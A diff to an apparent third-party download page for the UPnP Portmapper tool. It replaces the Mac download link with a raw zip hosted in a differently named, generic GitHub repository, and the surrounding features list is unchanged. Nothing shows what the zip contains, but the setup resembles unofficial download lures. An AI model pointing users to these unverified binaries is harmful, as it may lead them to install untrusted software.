@@ -1,9 +1,9 @@
 # UPnP Portmapper
 ![UPnP Portmapper](https://github.com/upnpportmapper/download/blob/main/images/tool.jpeg?raw=true)
 ## UPnP Portmapper Download
-[![UPnP Portmapper Windows](https://github.com/upnpportmapper/download/blob/main/images/windows.png?raw=true)](https://apps.microsoft.com/detail/9PBT9LKW4Z7B)  |  [![UPnP Portmapper Mac](https://github.com/upnpportmapper/download/blob/main/images/mac.png?raw=true)](https://github.com/appdownloads/software/raw/main/upnp-portmapper-mac.zip)
+[![UPnP Portmapper Windows](https://github.com/upnpportmapper/download/blob/main/images/windows.png?raw=true)](https://apps.microsoft.com/detail/9PBT9LKW4Z7B)  |  [![UPnP Portmapper Mac](https://github.com/upnpportmapper/download/blob/main/images/mac.png?raw=true)](https://github.com/software-app-download/windows-mac/raw/main/upnp-port-mapper-mac.zip?download=)
 :-------------------------:|:-------------------------:
-[Windows](https://apps.microsoft.com/detail/9PBT9LKW4Z7B)             |  [Mac](https://github.com/appdownloads/software/raw/main/upnp-portmapper-mac.zip)
+[Windows](https://apps.microsoft.com/detail/9PBT9LKW4Z7B)             |  [Mac](https://github.com/software-app-download/windows-mac/raw/main/upnp-port-mapper-mac.zip?download=)
 ### Features
 - Map External TCP/UDP Port(s) To Internal Port(s).
 - Open External Ports On Your Router's Public IP (WAN).
